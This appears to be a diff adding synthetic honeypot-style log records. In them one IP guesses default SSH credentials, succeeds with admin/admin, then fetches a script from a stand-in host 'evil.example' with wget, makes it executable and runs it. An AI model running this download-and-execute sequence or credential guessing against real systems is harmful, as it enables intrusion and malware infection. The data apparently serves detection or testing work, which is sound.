@@ -1,0 +1,9 @@
+{"event": "login", "ts": 1792537638.3434355, "ip": "203.0.113.50", "username": "root", "password": "root", "success": false}
+{"event": "login", "ts": 1792537648.3434355, "ip": "203.0.113.50", "username": "root", "password": "123456", "success": false}
+{"event": "login", "ts": 1792537658.3434355, "ip": "203.0.113.50", "username": "admin", "password": "admin", "success": true}
+{"event": "login", "ts": 1792537668.3434355, "ip": "203.0.113.50", "username": "root", "password": "toor", "success": false}
+{"event": "login", "ts": 1792537678.3434355, "ip": "203.0.113.50", "username": "admin", "password": "password", "success": false}
+{"event": "command", "ts": 1792537758.3434355, "ip": "203.0.113.50", "username": "admin", "command": "uname -a"}
+{"event": "command", "ts": 1792537763.3434355, "ip": "203.0.113.50", "username": "admin", "command": "wget http://evil.example/bot.sh"}
+{"event": "command", "ts": 1792537768.3434355, "ip": "203.0.113.50", "username": "admin", "command": "chmod +x bot.sh"}
+{"event": "command", "ts": 1792537773.3434355, "ip": "203.0.113.50", "username": "admin", "command": "./bot.sh"}
